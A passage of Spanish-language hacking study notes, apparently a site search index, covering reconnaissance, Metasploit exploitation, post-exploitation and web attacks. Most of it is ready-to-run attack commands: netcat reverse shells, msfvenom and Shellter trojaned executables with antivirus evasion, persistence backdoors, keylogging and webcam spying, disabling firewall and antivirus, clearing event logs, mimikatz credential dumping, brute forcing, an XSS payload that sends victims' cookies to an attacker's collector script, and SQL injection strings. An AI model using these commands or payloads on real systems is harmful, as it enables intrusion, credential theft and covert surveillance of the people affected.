root@192.168.122.2 # ----- comprobar que funciona ----------------------- # desde otro terminal de host1 abro un puerto nc -lvvp 6666 # desde otro terminal host1 proxychains nc 192 .168.122.1 6666 conexion a 192 .168.122.1 desde 192 .168.122.3 # desde host1 conectar con host final proxychains ssh root@127.0.0.1 root@host3~ $_ para a\u00f1adir mas nodos solo se tendr\u00eda que repetir las acciones echas en el host1 cambiando los puertos correspondientes y la ip del nodo a seguir.","title":"Secuencia de T\u00faneles"},{"location":"auditoria/apuntes_hacking/#identificacion-y-explotacion-de-vulnerabilidades-en-sistemas","text":"","title":"Identificaci\u00f3n y explotaci\u00f3n de vulnerabilidades en sistemas"},{"location":"auditoria/apuntes_hacking/#metodologia","text":"Para lograr auditar y vulnerar un sistema es necesario seguir una serie de pautas. Obtenci\u00f3n de datos: recolectar la m\u00e1xima informaci\u00f3n de los dispositivos de una organizaci\u00f3n, as\u00ed como servicios p\u00fablicos, etc... Enumeraci\u00f3n de sistemas: enumerar y organizar que sistemas o redes tiene dicha organizaci\u00f3n y versiones de dichos sistemas o servicios. An\u00e1lisis de vulnerabilidades: identificar las vulnerabilidades conocidas para cada sistema o servicio de la organizaci\u00f3n. Explotaci\u00f3n de vulnerabilidades: intentar acceder al dispositivo a trav\u00e9s de alguna vulnerabilidad. Post-extracci\u00f3n de vulnerabilidades: una vez dentro del sistema exportar datos sensibles, pivotar entre redes, asegurar conexiones futuras, etc... Documentaci\u00f3n.","title":"Metodolog\u00eda"},{"location":"auditoria/apuntes_hacking/#obtencion-de-datos","text":"Para la primera identificaci\u00f3n de datos se puede utilizar el comando whois o una aplicaci\u00f3n web similar a whois.domaintools.com de esta manera podremos extraer datos como: dns, n\u00fameros de tel\u00e9fono, localizaci\u00f3n y alg\u00fan dato \u00fatil mas. whois gencat.cat ... Registrant Name: Generalitat de Catalunya Registrant Organization: Generalitat de Catalunya Registrant Street: Via Laietana, 14 Registrant City: Barcelona Registrant State/Province: Registrant Postal Code: 08003 Registrant Country: ES Registrant Phone: +34.935676330 Registrant Email: dominis.ctti@gencat.cat ... Name Server: a16-65.akam.net Name Server: a1-133.akam.net Name Server: a11-64.akam.net .... Es importante hacer la resoluci\u00f3n de dominio para obtener la ip y volver a buscar con whois mas informaci\u00f3n.","title":"Obtenci\u00f3n de datos"},{"location":"auditoria/apuntes_hacking/#recoleccion-de-datos","text":"Para empezar a auditar una organizaci\u00f3n necesitamos obtener todos los sistemas aut\u00f3nomos a los que pertenece si es que los tiene, para despu\u00e9s extraer todos los rangos de ip publicas en las que se aloja, para extraer todos los dominios y subdominios que pertenece a dicha organizaci\u00f3n. Esta labor es lenta y bastante pesada ya que hay que estar atento a los detalles y en seg\u00fan que organizaci\u00f3n la cantidad de datos extra\u00eddos ser\u00e1 muy alta.","title":"Recolecci\u00f3n de datos"},{"location":"auditoria/apuntes_hacking/#analisis-de-direcciones-ip","text":"Para la extracci\u00f3n de direcciones ip existen aplicaciones como www.robtex.com que nos facilitara el trabajo. Esta aplicaci\u00f3n mediante un dominio o una direcci\u00f3n ip extrae una buena informaci\u00f3n como dns, subdominios, etc...","title":"An\u00e1lisis de direcciones ip"},{"location":"auditoria/apuntes_hacking/#curiosidad","text":"Se puede utilizar robtex para evitar los filtros que tienen algunas webs como mailinator o guerrillamail. Estas dos opciones son de correo basura temporal, lo primero que tenemos que hacer es a\u00f1adir el dominio de guerrillamail.com a robtex. En el apartado shared buscar using as mail server o partially sharing ip numbers . Este apartado devuelve los dominios y subdominios que apuntan a la ip del dominio principal. Por ultimo al enviar un email cambiar el dominio que nos a dado la web de guerrilla en el email, normalmente @sharklasers.com por el que hemos extra\u00eddo de robtex.","title":"Curiosidad"},{"location":"auditoria/apuntes_hacking/#analisis-de-sistemas-autonomos","text":"Un Sistema Aut\u00f3nomo (en ingl\u00e9s , Autonomous System : AS ) se define como \u201cun grupo de redes IP que poseen una pol\u00edtica de rutas propia e independiente\u201d. Esta definici\u00f3n hace referencia a la caracter\u00edstica fundamental de un Sistema Aut\u00f3nomo: realiza su propia gesti\u00f3n del tr\u00e1fico que fluye entre \u00e9l y los restantes Sistemas Aut\u00f3nomos que forman Internet. Un n\u00famero de AS o ASN se asigna a cada AS, el que lo identifica de manera \u00fanica a sus redes dentro de internet. Esto lo utilizan las organizaciones para tener mayor velocidad entre todos sus dominios y subdominios. Para la extracci\u00f3n y analisis de sistemas aut\u00f3nomos se pueden utilizar aplicaciones como www.ipv4info.com o bgphurricane Se puede buscar por dominio, ip , nombre sistema aut\u00f3nomo o nombre de la compa\u00f1\u00eda. De esta manera extraeremos todos los sistemas aut\u00f3nomos de la organizaci\u00f3n, sus rangos de ip p\u00fablicos y sus dominios.","title":"An\u00e1lisis de sistemas aut\u00f3nomos"},{"location":"auditoria/apuntes_hacking/#analisis-de-dominios-y-subdominios","text":"Una buena aplicaci\u00f3n para extraer subdominios es www.dnsdumpster.com , en ella le insertaremos el dominio a buscar y extraer\u00e1 sus subdominios junto a sus ip correspondientes.","title":"An\u00e1lisis de dominios y subdominios"},{"location":"auditoria/apuntes_hacking/#browser-hacking","text":"Operadores de b\u00fasqueda site:udemy.com # datos en udemy - # negacion #10..19# # rango intitle:\"index of /\" # buscar en titulo allintitle:\"index of /\" # busca en titulo exactamente \"index of /\" inurl:\"admin.php\" # buscar en la url intext:\"admin\" intext:\"password\" # buscar exclusibamente en el texto filetype:pdf # ficheros pdf ext:pdf # extensiones pdf inurl:admin && ext:sql # and (inurl:admin OR ext:sql ) # or google hacking database","title":"Browser Hacking"},{"location":"auditoria/apuntes_hacking/#herramienta-para-facilitar-el-analisis","text":"maltego es una herramienta gr\u00e1fica para recopilar informaci\u00f3n de una organizaci\u00f3n utiliza las aplicaciones anteriores como robtex, whois y otras para extraer toda la informaci\u00f3n. Al instalar maltego requiere la versi\u00f3n 8 de java para su funcionamiento, dejo una opci\u00f3n para su cambio r\u00e1pido de versi\u00f3n en el sistema. sudo update-alternatives --config java [ sudo ] password for debian: Existen 2 opciones para la alternativa java ( que provee /usr/bin/java ) . Selecci\u00f3n Ruta Prioridad Estado ------------------------------------------------------------ * 0 /usr/lib/jvm/java-11-openjdk-amd64/bin/java 1111 modo autom\u00e1tico 1 /usr/lib/jvm/java-11-openjdk-amd64/bin/java 1111 modo manual 2 /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java 1081 modo manual recorn-ng es otra aplicaci\u00f3n de terminal para recopilar informaci\u00f3n de una organizaci\u00f3n. recorn-ng [ recon-ng ][ default ] > workspaces add udemy [ recon-ng ][ udemy ] > add domains udemy.com [ recon-ng ][ udemy ] > show modules [ recon-ng ][ udemy ] > use recon/domains-hosts/hackertarget [ recon-ng ][ udemy ][ hackertarget ] > show info [ recon-ng ][ udemy ][ hackertarget ] > set SOURCE udemy.com SOURCE = > udemy.com [ recon-ng ][ udemy ][ hackertarget ] > run --------- UDEMY.COM --------- [ * ] [ host ] mx01.udemy.com ( 104 .16.91.52 ) [ * ] [ host ] web1.udemy.com ( 104 .16.91.52 ) [ * ] [ host ] mail1.udemy.com ( 104 .16.91.52 ) [ * ] [ host ] server1.udemy.com ( 104 .16.91.52 ) ... theharvester python theHarvester.py -d udemy.com -l 500 -b google","title":"Herramienta para facilitar el an\u00e1lisis"},{"location":"auditoria/apuntes_hacking/#extraccion-metadatos","text":"foca es un programa de windows para extraer los metadatos de archivos, a su vez si insertas un dominio busca todos los archivos p\u00fablicos en ese dominio y los analiza.","title":"Extracci\u00f3n metadatos"},{"location":"auditoria/apuntes_hacking/#enumeracion","text":"Una vez ya hemos recolectado toda la informaci\u00f3n de la organizaci\u00f3n, queda verificar que dispositivos est\u00e1n activos en los rangos y extraer versiones de servicios o sistemas operativos. De forma pasiva existen diferentes aplicaciones muy \u00fatiles. shodan dados unos patrones de b\u00fasqueda extrae datos sobre servicios, sistemas o puertos, entre otras. apache country:es net:150.224.0.0/16 port:80 title:portal org: \"Universidad autonoma de madrid\" zoomeye es muy similar a shodan. censys es similar a las anteriores con la opci\u00f3n de buscar por tipo certificado. De forma activa, tenemos las siguientes opciones: nmap puede extraer puertos abiertos, sistema operativo o versi\u00f3n del servicio. ( es un poco lento ) nmap -Pn 10 .1.1.0/24 # forzar escaneo todos los dispositivos -sT # servicios tcp -sU # servicios udp -p 443 ,80 # puertos -p- # todos los puertos -n # no hacer resolucion dns -T1 -T5 # t1 escaneo lento t5 rapido --top-ports = 10 --open # buscar top 10 puertos y mostrar solo abiertos -iL fichero-de-ips -sV # version servicio -O # version de sistema operativo -sC # lanzar scripts para interactuar con puertos -A # equivale a (-sV -sC -O tracerouter) netcat/nc Examina los puertos abiertos r\u00e1pidamente. nc -zvn 192 .168.88.4 22 -80 -z # escanea y lista servicios -v # vervose -n # no hacer resoluciones dns mediante dns podemos extraer datos de los dns mal configurados con las siguientes herramientas. Pedir al dns que haga una transferencia de zona y nos env\u00ede todos sus datos, est solo funcionara si esta mal configurado. host -t axfr udemy.com dig axfr @SERVIDOR.DNS udemy.com Extraer datos el dns dnsenum -enum udemy.com dnsenum -s 5 -p 5 udemy.com dnsrecon -ad udemy.com # intntar extraer subdominios dnsrecon -d udemy.com -t [ crt,goo,bing,axfr... ] dnsrecon -d escoladeltreball.org -D /home/debian/dicionario -t brt fierce -dns udemy.com","title":"Enumeraci\u00f3n"},{"location":"auditoria/apuntes_hacking/#analisis","text":"En el an\u00e1lisis nos dedicaremos a detectar las vulnerabilidades y explotarlas para intentar obtener el control del sistema. dos p\u00e1ginas muy utilizadas donde encontrar diferentes tipos de exploits son https://www.exploit-db.com , https://www.securityfocus.com .","title":"An\u00e1lisis"},{"location":"auditoria/apuntes_hacking/#deteccion-vulnerabilidades","text":"Se pueden detectar vulnerabilidades de forma manual o autom\u00e1tica, si tenemos un gran n\u00famero de dispositivos la forma manual es inviable, pero si solo queremos explotar un servicio es una opci\u00f3n. las aplicaciones mas conocidas para la detecci\u00f3n de vulnerabilidades son: nessus , http://www.openvas.org/ . detectar versi\u00f3n de smb y sus caracter\u00edsticas: nmap -p445 -T4 -sT -A 10 .0.0.1 enum4linux -t 10 .0.0.1","title":"Detecci\u00f3n vulnerabilidades"},{"location":"auditoria/apuntes_hacking/#tipologia-de-exploits","text":"Cuando hablamos de un exploit nos referimos al software que permite tomar cierta ventaja de una vulnerabilidad ya sea para acceder al sistema, elevar privilegios, realizar denegaci\u00f3n de servicios, etc... Exploits remotos: Son aquellos que se lanzan de forma remota a aquellos dispositivos que se tiene visibilidad. Exploits locales: son aquellos que se lanzan una vez ya estas dentro del sistema, normalmente para elevar privilegios. Exploits del lado del cliente: Son los que se lanzan normalmente a una plataforma web y afectara a los clientes que se conecten a dicha plataforma.","title":"Tipolog\u00eda de exploits"},{"location":"auditoria/apuntes_hacking/#tipos-de-conexion","text":"","title":"Tipos de conexi\u00f3n"},{"location":"auditoria/apuntes_hacking/#conexion-directa","text":"En la conexi\u00f3n directa accedes estableces un t\u00fanel desde el host atacante al vulnerable, el vulnerable tendr\u00e1 un puerto abierto en escucha y conectaremos contra \u00e9l. Este tipo de conexiones es posible que fallen ya que en el firewall se acede desde fuera hacia adentro y si esta bien configurado lo filtrara. # host vulnerable abre puerto de escucha nc -lvvp 1234 -e /bin/bash # atacante se conecta a puerto conocido nc 10 .0.0.5 1234 ~# _","title":"Conexi\u00f3n directa"},{"location":"auditoria/apuntes_hacking/#conexion-inversa","text":"En esta conexi\u00f3n lo que se crea un t\u00fanel que sale del host vulnerable al host atacante, de esta forma en la gran mayor\u00eda de firewalls no lo filtraran. El modo de uso es el atacante abre un puerto a la escucha y el vulnerable mediante un exploit se conectara al atacante. # atacante abre su puerto nc -lvvp 1234 # vulnerable se conecta al atacante nc 10 .0.0.6 -e /bin/bash","title":"Conexi\u00f3n inversa"},{"location":"auditoria/apuntes_hacking/#metasploit","text":"Metasploit es una herramienta que facilita mucho la hora de explotar una vulnerabilidad, b\u00e1sicamente trabaja con una base de datos donde se encuentran todos sus exploits y luego ejecuta un payload, que ser\u00eda la acci\u00f3n que quieres hacer al haber accedido al sistema. tambi\u00e9n tiene la aplicaci\u00f3n artimage que seria su equivalente gr\u00e1fica, aun que tiene un rendimiento menor. Toda la informaci\u00f3n de metasploit se encuentra en /usr/share/metasploid-framework/ y dentro de modules/exploits/ se encuentran todos los exploits que utiliza, si quisi\u00e9ramos a\u00f1adir alguno, solo tendr\u00edamos que copiarlo en este directorio. Al iniciar metasploit lo primero que tenemos que comprobar es que la base de datos esta bien conectada. msfconsole # iniciar metasploit msf> search ms08 # hacer busqueda en bd # en el caso de no tener BDatos msf> exit msfdb init # volver aentrar y comprobar msfconsole msf> db_status msf> db_rebuild_cache","title":"Metasploit"},{"location":"auditoria/apuntes_hacking/#workspaces","text":"Para organizarnos en caso de hacer varias tareas a la vez usaremos diferentes espacios de trabajo. workspace -h # help workspace -a udemy # crear spacio udemy workspace -d udemy # eliminar udemy workspace udemy # entrar en espacio udemy workspace # ver espacios disponibles","title":"workspaces"},{"location":"auditoria/apuntes_hacking/#exploit","text":"con el exploit lo que hacemos es atacar la vulnerabilidad. search ms08 # buscar la vulnerabilidad que queremos use exploit/windows/smb/ms08_067_netapi # cargarla show info # ver informaci\u00f3n show options # ver opciones de parametros requeridos set # a\u00f1adir parameros Por cada exploit en la p\u00e1gina https://www.rapid7.com/db esta un peque\u00f1o manual de uso, esta p\u00e1gina es de los mismos creadores de metasploit y se actualiza peri\u00f3dicamente.","title":"Exploit"},{"location":"auditoria/apuntes_hacking/#payloads","text":"Son las acciones a realizar justa al haber ejecutado el exploit. Ejemplos de payloads: windows/adduser # creaci\u00f3n de usuarios windows/vncinject/reverse_tcp # conexi\u00f3n vnc windows/shell/reverse_tcp # tunel inverso Estas payloads tambi\u00e9n tienen sus opciones de par\u00e1metro y se tendr\u00e1n que a\u00f1adir con set","title":"Payloads"},{"location":"auditoria/apuntes_hacking/#explotar-vulnerabilidad","text":"Para explotar una vulnerabilidad hay que cargar un exploit y un payload y a\u00f1adir sus parametros requeridos. en este caso explotaremos una vulnerabilidad de los dispositivos windows xp,2003 de smb. msfconsole workspace udemy # acceder al spacio de trabajo elejido search exploid ms08 # buscar el exploid que queremos use exploit/windows/smb/ms08_067_netapi # cargarlo show options # ver opciones requeridas set rhost 10 .0.0.10 # a\u00f1adir remote host requerido set payload windows/meterpreter/reverse_tcp # cargar payload de tunel inverso show options # ver opciones requeridas set lhost 10 .0.0.5 # a\u00f1adir local host requerido exploit # ejecutar ordenes meterpreter >_ # si todo a ido bien nos debuelve una shell en la victima","title":"Explotar vulnerabilidad"},{"location":"auditoria/apuntes_hacking/#background","text":"Una vez conectado en un host interactivamente tendremos una terminal, y si queremos seguir con otras cosas podemos echar mano al background, que llega a ser tener diferentes sesiones de metasploit. metasploit@maquina-remota> background # o tambi\u00e9n Ctrl+Z dejar en segundo plano msf> sessions # ver sesiones abiertas ms> session -i 5 # acceder a la session 5","title":"Background"},{"location":"auditoria/apuntes_hacking/#importar-datos-de-nmap","text":"Es posible que si tenemos datos de nmap previos importarlos y as\u00ed trabajar con ellos desde metasploit nmap 10 .0.0.5 -A -Pn -n -oX pruevas-windows.xml # ejecutar nmap dejando datos en salida xml msfconsole # entrar en metasploit msf> db_import /root/escaneos/pruevas-windows.xml # importar archivo msf> hosts # datos de hosts msf> services # datos de servicios # se puede ejecutar directamente nmap desde metasploit tambi\u00e9n msf> db_nmap -A 10 .0.0.5 filtrado hosts -c column,columna -S filtrado services -c columna,columna 10 .0.0.5 services -p 445","title":"Importar datos de nmap"},{"location":"auditoria/apuntes_hacking/#anadir-modulos","text":"mkdir /usr/share/metasploid-framework/modules/exploits/test # o si lo quieres solo para un usuario mkdir -p ~/.msf4/modules/exploits/test # a\u00f1dir el modulo dentro de test cp test-module.rb /usr/share/metasploid-framework/modules/exploits/test/ # recargar modulos en metasploit msf> reload_all msf> use exploits/test/test-module","title":"A\u00f1adir m\u00f3dulos"},{"location":"auditoria/apuntes_hacking/#generar-archivo-con-payload","text":"msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost = 10 .1.1.22 lport = 4445 -e x86/shikata_ga_nai -i 3 -f exe -o test.exe msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp show options set lhost 10 .1.1.22 set lport 4445 exploit","title":"Generar archivo con payload"},{"location":"auditoria/apuntes_hacking/#post-explotacion","text":"En la post-explotaci\u00f3n ya estamos dentro del sistema vulnerable y este paso las tareas son: elevar privilegios, analizar comportamiento del usuario, an\u00e1lisis tr\u00e1fico red, abrir puertas traseras, acceder a otras redes.","title":"Post-explotaci\u00f3n"},{"location":"auditoria/apuntes_hacking/#extraer-informacion-del-sistema","text":"siempre desde la terminal de metasploit> help use -l sysinfo getuid # usuario corriendo getpid # pid corriendo ps # procesos migrate 368 # cambiar a proceso 368 run checkvm # verificar si es una maquina virtual run get_env # ver variables de entorno run get_application_list # ver aplicaciones instaladas run scraper # exportar informaci\u00f3n del sistema run winenum # lo mismo con mas datos ~/.msf4/logs/scripts/scraper estos dos comandos exportan datos a la m\u00e1quina local, por lo tanto hacen mucho ruido","title":"Extraer informaci\u00f3n del sistema"},{"location":"auditoria/apuntes_hacking/#elevar-privilegios","text":"getuid # ver privilegios actuales getsystem -h getsystem # levar privilegios a system getuid rev2self # volver a privilegios anteriores hashdump # ver credenciales usuarios, equivale a /etc/passwd Para que metasploit pese menos, no carga todas las librer\u00edas por defecto. Podemos cargar las opcionales a medida que las necesitamos. use mimikatz # cargar libreria mimikatz wdigest # ver credenciales use kiwi # cargar libreria kiwi creds_all # ver credenciales","title":"Elevar privilegios"},{"location":"auditoria/apuntes_hacking/#eliminar-rastros-y-sistemas-de-seguridad","text":"clearev # borrar visor de eventos shell # acceder a la shell del sistema # desactivar firewall netsh show opmode netsh firewall set opmode mode = disable profiles = all run killav #desactivar antivirus","title":"Eliminar rastros y sistemas de seguridad"},{"location":"auditoria/apuntes_hacking/#espionaje","text":"keyscan_start # espiar movimiento de teclado keyscan_dump # exportar movimientos keyscan_stop screenshot # extraer sccreenshot del sistema run vnc # abrir ventana vnc record_mic 10 # grabar micro 10 segundos webcam_list webcam_snap 1 # extraer foto de camara 1 webcam_stream # extraer video en directo webcam_chat # abrir chat","title":"Espionaje"},{"location":"auditoria/apuntes_hacking/#snifer","text":"use sniffer sniffer_interfaces sniffer_start 1 1024 # numero de interfaz y buffer sniffer_dump 1 pruebas.pcap sniffer_stop 1","title":"Snifer"},{"location":"auditoria/apuntes_hacking/#backdoor","text":"run persistence -h run persistence -A -L c: \\\\ temp \\\\ -X -i 3600 -p 4443 -r 10 .1.1.22 # si a ido bien devolvera datos de lo que hace incluido donde aloja los scripts # para dejar que conecte automaticamente resource ~/.msf4/persistence/.../...rc # esto lo que hace es borrar los archivos del persistence -A ejecutar al arrancar -L localizaci\u00f3n del payload -X conectar en el boot de windows -i periodo de reintento en segundos Una vez que esta lanzado el persistence en la m\u00e1quina vulnerable, tenemos que abrir nuestro puerto para que se conecte. use exploit/multi/handler set payload windows/meterpreter/reverse_tcp show options set lhost 10 .1.1.22 set lport 4443 exploit","title":"Backdoor"},{"location":"auditoria/apuntes_hacking/#pivoting","text":"ipconfig background route add 10 .1.2.0/24 1 # el 1 es el numero de sesion route","title":"Pivoting"},{"location":"auditoria/apuntes_hacking/#conectar-de-windows-a-windows","text":"En el caso que queramos acceder desde un host windows a otro windows remotamente desde linea de terminal, es posible con psexec . Este se encuentra entre los ejecutables de pstools que podemos encontrar en las herramientas de windows. https://docs.microsoft.com/en-us/sysinternals/downloads/pstools # programa ip-destino dominio\\usuario contrase\u00f1a que-ejecutar psexec.exe \\\\ 10 .1.1.13 -u WIN7 \\p edro -p pedro123 cmd.exe El problema de esta opci\u00f3n es que tenemos que tener todos los datos.","title":"Conectar de windows a windows"},{"location":"auditoria/apuntes_hacking/#de-shell-a-meterpreter","text":"Si por la raz\u00f3n que sea solo hemos podido acceder a un dispositivo windows desde una shell y queremos utilizar las utilidades de meterpreter, tenemos una posible soluci\u00f3n. use exploit/windows/smb/psexec set payload windows/shell/reverse_tcp set .... # a\u00f1adir opcione requeridas exploit C:> Ctl+Z # dejar sesion en 2\u00ba plano use post/multi/manage/shell_to_meterpreter set lhost ... set session ... run sessions # ver sesiones activas, ( se habra creado ua nueva ) sessions -i ... # entrar en sesion nueva Donde a\u00f1ado ... introducir el argumento por el payload o comando.","title":"De shell a meterpreter"},{"location":"auditoria/apuntes_hacking/#extraer-credenciales","text":"Desde windows tenemos el programa mimikatz que entre otras cosas, nos permite extraer las credenciales de los usuarios con un sesi\u00f3n abierta, ya que mimikatz las extra los datos temporales cargados en ram. descargar mimikats: https://github.com/gentilkiwi/mimikatz/releases ejecutar el archivo exe con permisos de administrador de la arquitectura de vuestro sistema operativo. mimikatz.exe privilege::debug # comprobar privilegios sekurlsa::logonpasswords # extraer credenciales ram Bien ahora combinando psexec y mimikatz podr\u00edamos llegar a extraer los datos de la cuenta admin de un host remoto desde un usuario sin privilegios. psexec.exe \\\\ 10 .1.1.13 -u WIN7 \\p edro -p pedro123 -c mimikatz privilege::debug sakurlsa::logonpasswords exit > crecenciales.txt","title":"Extraer credenciales"},{"location":"auditoria/apuntes_hacking/#ophcrack","text":"Es un programa tanto instalable como portable que extrae los hash el sistema y tiene la posibilidad de crackear mediante fuerza bruta los hashes.","title":"Ophcrack"},{"location":"auditoria/apuntes_hacking/#procdump","text":"Es otro programa de windows para extraer hash del sistema, este los extrae en un formato .dmp para posteriormente descifrarlo con mimikatz u otros. Los archivos que utiliza para esta extracci\u00f3n son windows/system/config/{sam,system} procdump.exe -na lsass.exe lsassdump -accepteula mimikatz.exe sekurlsa::minidump lsassdump.dmp sekurlsa::logonpasswords","title":"Procdump"},{"location":"auditoria/apuntes_hacking/#unshadowjohn","text":"Estos son 2 comandos de linux donde juntan los usuarios con sus contrase\u00f1as cifradas en un archivo, para posteriormente descifrarlas mediante fuerza bruta. unshadow /etc/passwd /etc/shadow > hash-unix john hash-unix","title":"unshadow/john"},{"location":"auditoria/apuntes_hacking/#fuerza-bruta","text":"Esta la posibilidad de utilizar fuerza bruta para resolver contrase\u00f1as, hay diferentes m\u00e9todos: profundidad: 1 usuario muchas contrase\u00f1as anchura: muchos usuarios y una contrase\u00f1a profundidad/anchura: muchos usuarios y muchas contrase\u00f1as. Estos procesos son muy lentos y en seg\u00fan que casos el servicio puede bloquearnos por el uso excesivo de pruebas, en todo caso este m\u00e9todo hace uso de diccionarios, es decir una lista muy grande de posibilidades e ir probando hasta que alguna coincida. hydra -L users -p Soc123 -vV 10 .1.1.5 smb # diccionario de usuarios a 1 contrase\u00f1a hydra -l soc -P paswords -vV 10 .1.1.5 smb # diccionario de passwords a 1 usuaro hydra -L users -P paswords -vV 10 .1.1.5 smb # diccionario de users y passwords M\u00f3dulos de medusa /usr/lib/medusa/modules medusa -u soc -p soc1234 -h 10 .0.0.5 -M smb ncrack -p 445 --user soc --pass soc123 10 .0.0.5 ncrack -p 445 -U users --pass soc123 10 .0.0.5","title":"Fuerza bruta"},{"location":"auditoria/apuntes_hacking/#evadir-antivirus","text":"Podemos ver si un archivo se detecta como malicioso para los antivirus con diversas aplicaciones como virustotal o nodistribute , esto nos puede interesar a la hora de crear un ejecutable malicioso subirlo primero a una de estas aplicaciones, comprobar su efectividad y distribuirlo si fuera necesario. Hay que decir que virustotal tiene una base de datos de antivirus m\u00e1s grande, pero reporta a las empresa los virus detectados, as\u00ed que seg\u00fan que quieras hacer es mejor no subirlo en dicha p\u00e1gina. Con msfvenom podemos crear ejecutables maliciosos, el inconveniente es que casi todos los antivirus lo detectan. msfvenom -p windows/meterpreter/reverse_tcp LHOST = 10 .0.0.5 LPORT = 4444 -f exe > /tmp/shell.exe","title":"Evadir antivirus"},{"location":"auditoria/apuntes_hacking/#veil-evasion","text":"Proporciona payloads con cripters, es decir aporta diferentes payloads con diferentes capas de encriptado para que los antivirus le cueste detectar que es un ejecutable malicioso. instalar dependencias: Install Python 2.7, Py2Exe, PyCrypto, and PyWin32 on a Windows computer (for Py2Exe). instalaci\u00f3n: apt-get -y install git git clone https://github.com/Veil-Framework/Veil-Evasion.git cd Veil-Evasion/ cd setup setup.sh -s m\u00e9todo de uso: python vail-evasion.py list # listar payloads use 47 # utilizar payload 47 set lhost 10 .0.0.5 # a\u00f1adir opci\u00f3n requerida generate # generar exe","title":"veil-evasion"},{"location":"auditoria/apuntes_hacking/#shellter","text":"Shellter es de las mejores opciones enmascarando un ejecutable malicioso, ya que permite introducir un ejecutable dentro de otro, por lo tanto el usuario abrir\u00e1 el ejecutable interactuar\u00e1 con el programa principal, y en segundo plano nuestro ejecutable interno se ejecutara en segundo plano. directorio de producci\u00f3n /usr/share/shellter directorio donde encontramos los binarios de windows /usr/share/windows-binaries/ En el siguiente ejemplo introducimos un reverse_tcp en un ejecutable vnc . apt install shellter cd /usr/share/shellter cp /usr/share/windows-binaries/vncviewer.exe ./ shellter # abrir shelter vncviewer.exe # binario a utilizar Enable Stealth Mode? # habilitar que se ejecute el payload en segundo plano Y Use a listed payload or custom? # utilizare un payload de la lista L select payload by index: # el Meterpreter_reverse_TCP en lalista es el 1 1 set lhost 10 .0.0.7 # donde se va a conectar set lport 8888 # por que puerto # ya podemos recoger nuestro archivo vncviewer.exe modificado del directorio actual. Usarlo: abrir puerto en linux msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10 .0.0.7 set lport 8888 exploit ejecutar en un windows el vmviewer.exe que hemos modificado y se conectara autom\u00e1ticamente al linux en la consola del meterpreter.","title":"shellter"},{"location":"auditoria/apuntes_hacking/#evadir-autenticacion","text":"Existen diferentes formas de evadir la autenticaci\u00f3n de sistemas operativos. Una buena manera en windows es con el programa kon-bootcd que es una iso booteable y ella sola se encarga de todo. https://archive.org/details/Kon-bootForCD Tambi\u00e9n est\u00e1n otros m\u00e9todos como DLC, Hirens y otros Desde linux siempre esta la opci\u00f3n de arrancar en modo emergency siempre y cuando el grub te lo permita.","title":"Evadir autenticaci\u00f3n"},{"location":"auditoria/apuntes_hacking/#vulnerabilidades-en-aplicaciones-web","text":"","title":"vulnerabilidades en aplicaciones web"},{"location":"auditoria/apuntes_hacking/#metodologia_1","text":"Mapeo y an\u00e1lisis de la aplicaci\u00f3n Analizar toda la aplicaci\u00f3n, detectar contenido oculto, identificar funcionalidades como put delete, identificar que tecnolog\u00edas utiliza. Pruebas en los controles del cliente Pruebas en el mecanismo de autenticaci\u00f3n Analizar el proceso de autenticaci\u00f3n, enumerar usuarios, funcionalidad recordar credenciales. Pruebas en el manejo de sesiones Analizar la sesi\u00f3n que se crea, como y cuanto tarda, verificaci\u00f3n de tokens y cookies, fijaci\u00f3n de sesiones, cross-site request fotgety enlace malicioso que cambia credenciales de usuario etc.. Pruebas en el control de autorizaci\u00f3n Elevaci\u00f3n privilegios vertical de user a admin etc.. o lateral de user1 a user2. Pruebas en la l\u00f3gica de la aplicaci\u00f3n Pensar en algo que el desarrollador no aya pensado para modificar la web","title":"Metodolog\u00eda"},{"location":"auditoria/apuntes_hacking/#ataques-conocidos","text":"owasp es un proyecto que facilita las auditorias en aplicaciones web, su propia web te facilita diferentes aplicaciones para auditar como para entrenar tus conocimientos. pentesterlab es otra web donde practicar y encontrar recursos para auditorias.","title":"Ataques conocidos"},{"location":"auditoria/apuntes_hacking/#herramientas","text":"mantra es un navegador tuneado donde encuentras una serie de plugins muy \u00fatiles para la auditoria web. burpsuit , zap proxy ,: Son proxys de intercepci\u00f3n de peticiones, con ellos podr\u00e1s interceptar una petici\u00f3n , modificarla para luego mandarla con con las modificaciones asignadas. dirbuster fuerza bruta a contenido oculto de una web","title":"Herramientas"},{"location":"auditoria/apuntes_hacking/#xss","text":"xss es un tipo de vulnerabilidad donde una aplicaci\u00f3n web te permite ejecutar c\u00f3digo en un cuadro de texto. Este vulnerabilidad es muy utilizada en aplicaciones como facebook, etc.. para extraer credenciales. Se manda un enlace con el c\u00f3digo camuflado para que la victima clique y sin enterarse haga una acci\u00f3n en segundo plano. por ejemplo: En el siguiente ejemplo se ejecutara c\u00f3digo en un cuadro de texto para extraer las cookies de un usuario y mand\u00e1rselas remotamente a otro. crear una web que ejecute php y insertar este archivo para recibir las cookies mediante url y almacenarlas en cookies_list.txt cookies.php <?php $handle = fopen ( \"cookies_list.txt\" , \"a\" ); fputs ( $handle , \" \\n \" . $_GET [ \"cookie\" ] . \" \\n \" ); fclose ( $handle ); ?> comprobar que funciona 10.1.1.3/cookies.php?cookie=test c\u00f3digo a inyectar mediante xss < script > var i = new Image (); i . src = \"http://10.1.1.3/cookies.php?cookie=\" + document . cookie ;</ script > este c\u00f3digo hay que insertarlo dentro de alg\u00fan cuadro de texto vulnerable y mediante un acortador de url como https://bitly.com/ crear un link. Una vez recogidas las coockies, con mantra u otro insertarnos las cookies estraidas para acceder a la sesi\u00f3n de la victima.","title":"xss"},{"location":"auditoria/apuntes_hacking/#evasion-de-filtros","text":"https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion https://html5sec.org/","title":"Evasi\u00f3n de filtros"},{"location":"auditoria/apuntes_hacking/#sql-injection","text":"https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF # extraer bases de datos 10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,schema_name,3,4,5+from+information_schema.schemata+--+- existe la tabla exercises # extraer tablas 10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,table_name,3,4,5+from+information_schema.tables+where+table_schema='exercises'+--+- existe la tabla users # extraer columnas 